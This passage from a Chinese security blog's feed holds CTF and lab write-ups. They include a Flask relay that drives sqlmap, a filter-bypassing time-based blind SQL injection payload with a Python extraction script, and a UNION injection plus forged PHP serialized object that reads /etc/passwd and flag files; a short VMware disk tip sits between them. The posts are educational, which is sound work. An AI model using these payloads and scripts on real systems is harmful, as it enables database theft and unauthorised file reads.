class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>  request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        payload = request.form.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> custom_fun(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>流程示意图如下：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/sql.drawio.png"></p>
<h3 id="完整注入过程"><a href="#完整注入过程" class="headerlink" title="完整注入过程"></a>完整注入过程</h3><p>先来看看本例的实现代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_fun</span>(<span class="params">payload</span>):</span></span><br><span class="line">    email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(random.random() * <span class="number">10000000</span>))</span><br><span class="line">    username = payload</span><br><span class="line">    password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="comment"># 注册</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/register.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;name&quot;</span>: username, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;repw&quot;</span>: password, <span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    resp = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 登陆</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130:80/web/login.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/login.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r1 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 登陆后跳转到首页</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130/web/index.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    resp = session.get(burp0_url, headers=burp0_headers, proxies=proxy)    </span><br><span class="line">    resp.encoding = resp.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>  request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        payload = request.form.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> custom_fun(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>从代码上可以看到，只需要把请求逻辑写到<code>custom_fun</code>函数中，把最终结果的响应包return给flask，剩下的就可以交给sqlmap了，优雅！</p>
<p>这里说一个小技巧，可以使用Burp的拓展<code>Copy As Python-Requests</code>来一键把burp的请求复制为Python requests请求：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-19-19.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-21-23.png"></p>
<p>然后使用sqlmap测试一下，因为是通过本地flask中转，我们的sqlmap的target应该是本地的flask服务端口，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1</span><br></pre></td></tr></table></figure>
<p>检测时flask服务的输出：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-30-49.png"><br>成功检测到注入点：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-25-10.png"><br>当前数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 --current-db</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-27-11.png"><br>跑表名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 -D <span class="built_in">test</span> --tables</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-28-11.png"><br>跑flag表数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 -D <span class="built_in">test</span> -T flag --dump</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-44-35.png"></p>
<h3 id="测试环境代码"><a href="#测试环境代码" class="headerlink" title="测试环境代码"></a>测试环境代码</h3><p>GitHub：<a href="https://github.com/ryanInf/fakeZhangSan">https://github.com/ryanInf/fakeZhangSan</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware虚拟机磁盘空间压缩</title>
    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
<p>执行后等待进度条结束即可：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
<a id="more"></a>

<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
<p>压缩后占用：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>blacklist_writeup</title>
    <url>/2020/10/21/blacklist-writeup/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文为某次培训练习题解题过程，该题考察SQL注入绕过方法，难度中等。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><ol>
<li>观察题目，可知道本题考察SQL注入绕过，经过测试，发现拦截<code>=</code>、<code>and</code>、<code>or</code>、<code>,</code>、<code> </code>（空格） </li>
<li><code>=</code> 可用<code>like</code>代替</li>
<li><code>and</code> 可用<code>&amp;</code>代替</li>
<li><code>or</code> 可用<code>|</code>代替</li>
<li>空格可用注释绕过<code>/**/</code></li>
<li>逗号可用<code>from a for b</code>绕过，但是仅限于函数内逗号，所以本题不能使用<code>union select 1,flag from flag</code>来直接获取到结果（误，可以使用<code>join</code>绕过，见方法二）<br>以下为以前使用过的一个绕过逗号拦截的payload，我们可以在它的基础上进行修改：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (substring((select user()) from 1 for 1)&#x3D;&#39;c&#39;) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure></li>
<li>ctf注入题的flag通常在flag表，所以我们直接跑这个表了，所以把payload修改为如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (substring((select * from flag) from 1 for 1)&#x3D;&#39;c&#39;) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure></li>
<li>因为<code>for</code> 里面的<code>or</code>也会拦截，所以换成这种写法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from a  &#x2F;&#x2F;表示从最后一个字母取，取a个字母，如果越界则为空值</span><br><span class="line">select substring((select user()) from -14);</span><br></pre></td></tr></table></figure>
所以payload修改为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (select * from (select case when (ascii(substring((select * from flag) from -1))&#x3D;2) then sleep(3) else 0 end)A) -- </span><br></pre></td></tr></table></figure>
这里的-1表示截取倒数第一个字符，2与该字符的ASCII码进行比对</li>
<li>然后替换<code>and</code> 为<code>&amp;</code>，<code>=</code>为<code>like</code>，<code> </code>（空格）为<code>/**/</code>，因为最后的<code>--</code>注释符替换成<code>/**/--/**/</code>的话会失效，所以使用<code>#</code>注释，最终payload：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;&#x2F;**&#x2F;&amp;&#x2F;**&#x2F;(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;(ascii(substring((select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;-1))&#x2F;**&#x2F;like&#x2F;**&#x2F;125)&#x2F;**&#x2F;then&#x2F;**&#x2F;sleep(3)&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)A)#</span><br></pre></td></tr></table></figure>
我们知道flag字符串最终位为<code>&#125;</code>，其ASCII码值为<code>125</code>，所以测试这位的值来验证我们的payload，可以看到确实延迟了3s：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-47-49.png"><br>如果修改为错误的值则不会：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-48-34.png"></li>
<li>那么我们就可以根据上面的payload编写最终exp了：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">keynum, chrord</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://x.x.x.x:xxxxx/?id=1&#x27;/**/%26/**/(select/**/*/**/from/**/(select/**/case/**/when/**/(ascii(substring((select/**/*/**/from/**/flag)/**/from/**/-&#123;&#125;))/**/like/**/&#123;&#125;)/**/then/**/sleep(2)/**/else/**/0/**/end)A)%23&quot;</span>.<span class="built_in">format</span>(keynum, chrord)</span><br><span class="line">    <span class="comment"># print(burp0_url)</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o19hhhgs7vncjnq8ffmlubp3h1&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagchars = string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;&#125;_-&#x27;</span></span><br><span class="line">flagchars_ordlist = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> flagchars]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pre_chr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagchars_ordlist:</span><br><span class="line">        c = <span class="built_in">chr</span>(j)</span><br><span class="line">        retry = <span class="number">3</span></span><br><span class="line">        <span class="keyword">while</span> retry &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                now = time.time()</span><br><span class="line">                exp(i, j)</span><br><span class="line">                end = time.time()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># 重试</span></span><br><span class="line">                retry -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> end - now &gt; <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(c)</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in letters&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
运行结果：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-50-12.png"></li>
</ol>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用<code>join</code>可以把两个表查询的结果左右合并，从而拼接多个字段，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)a <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)c;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-45-38.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 创建数据库及表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag (flag <span class="type">varchar</span>(<span class="number">43</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> flag (flag) <span class="keyword">values</span> (<span class="string">&#x27;flag&#123;810a9492-bfac-4a9b-be38-823b6efd7ab5&#125;&#x27;</span>);</span><br><span class="line"># 测试语句</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)a <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">1</span>) a;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-46-49.png"></p>
<p>根据上面的实验，最终构造如下payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/&amp;/**/1/**/like/**/0/**/union/**/select/**/*/**/from/**/(select/**/1)a/**/join/**/(select/**/*/**/from/**/flag)b#</span></span><br></pre></td></tr></table></figure>
<p>编码后发送可取得flag<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-50-59.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>fakebook-writeup</title>
    <url>/2020/11/17/fakebook-writeup/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本题来源于2018年网鼎杯，攻防世界WEB进阶019上是原题。题目考察的是SQL注入中的UNION注入、SSRF和反序列化的组合利用，是一道比较综合性的题目，值得学习。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开题目链接，注册用户</p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161419002.png"></p>
<p>可以测试发现<code>view.php</code>可能存在SQL注入：</p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161700710.png"></p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161737441.png"></p>
<p>使用<code>order by</code>测试，枚举到此注入点有5列数据，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 order by 5</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162320725.png"></p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162029502.png"></p>
<p>使用<code>UNION SELECT</code>测试注入点，发现<code>UNION SELECT</code>会被拦截，使用注释符绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;1 union select 1,2,3,4</span><br><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162619206.png"></p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162818925.png"></p>
<p>可以看到第二列输出到了页面，先获取当前用户名试试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,user(),3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163048623.png"></p>
<p>查询所有数据库名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(SCHEMA_NAME) from information_schema.schemata)a,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163314771.png"></p>
<p>查询fakebook的所有表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(TABLE_NAME)from information_schema.TABLES WHERE TABLE_SCHEMA&#x3D;&#39;fakebook&#39;)a,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163519847.png"></p>
<p>查询fakebook的users表所有列名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;&#39;fakebook&#39; and TABLE_NAME&#x3D;&#39;users&#39;)a,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163823008.png"></p>
<p>查询fakebook的users表的数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(no,&#39;&#x3D;&#39;,username,&#39;&#x3D;&#39;,passwd,&#39;&#x3D;&#39;,data) from users)a,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117164906117.png"></p>
<p>观察<code>data</code>列及页面报错，推测存在反序列化漏洞，直接修改序列化的字符串中的url和长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;222&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:18:&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117170538935.png"></p>
<p>枚举几个常见flag文件路径，最终得到flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;222&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117170930461.png"></p>
<p>小插曲，读取<code>index.php</code>中也有一个flag字符串，一度认为这是最终flag，却提示错误，此处想暴打出题人！</p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117171213101.png"></p>
<h3 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h3><p>mysql中有一个load_file()函数,这个函数可以读取本地文件,但是有两个条件:</p>
<ul>
<li>用户有很高的权限</li>
<li>知道文件的绝对路径</li>
</ul>
<p>本题中数据库恰好使用了root用户：</p>
<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117111540613.png"></p>
<p>那么可以通过<code>load_file</code>读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117111510196.png"></p>
<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;?php require_once &#39;db.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;user.php&#39;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;FLAG&#123;flag is in your mind&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new DB();</span><br><span class="line">$user &#x3D; new UserInfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fakebook&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php include &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div 